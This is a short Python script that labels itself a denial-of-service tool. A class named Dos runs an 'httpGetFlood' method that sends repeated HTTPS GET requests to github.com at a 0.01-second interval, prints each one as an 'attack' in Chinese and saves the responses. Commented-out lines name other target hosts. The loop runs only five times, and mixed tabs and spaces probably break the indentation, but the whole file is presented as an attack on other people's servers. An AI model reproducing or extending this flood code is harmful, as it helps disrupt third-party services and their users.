import http.client
import urllib
import time

class Dos(object):
    def __init__(self):
        pass

    def httpGetFlood(self,sleepTime,servAddr,url):
        for i in range(5):
            print('第',i+1,'次攻击')
            time.sleep(sleepTime)
            try:
                #conn = http.client.HTTPConnection(servAddr)
                #conn.request('GET',url)
                #r1 = conn.getresponse()
                #print(r1.status,r1.reason)
                #conn.close()

		#conns = httplib.HTTPSConnection(servAddr)
		#sock = socket.create_connection((conns.host, conns.port))
		#conns.sock = ssl.wrap_socket(sock, ca_certs=CERT_FILE, cert_reqs=ssl.CERT_REQUIRED, ssl_version=ssl.PROTOCOL_TLSv1)
		#conns.request('GET',url)
                #r1 = conns.getresponse()
                #print(r1.status,r1.reason)
                #conns.close()

                conns=http.client.HTTPSConnection(servAddr)
                conns.request("GET", url)
                r1 = conns.getresponse()
                #print(r1.status, r1.reason, r1.read())
                print(r1.status, r1.reason)

                fp = open("test_file", "wb")
                #fp.write(r1.content)
                fp.write(r1.read())

		conns.close()
            except IOError as e:
                print("except:",e)
            finally:
                pass
        print("httpGetDoS END")



if __name__ == '__main__':
    #servAddr = "raw.githubusercontent.com/bl201809/bllist/master"
    servAddr = "github.com"
    #servAddr = "www.dthas.info"
    url = "/bl201809/bllist/blob/master/index.html"
    #url = "/index.html"
    sleepTime = 0.01
    hack = Dos()
    hack.httpGetFlood(sleepTime,servAddr,url)
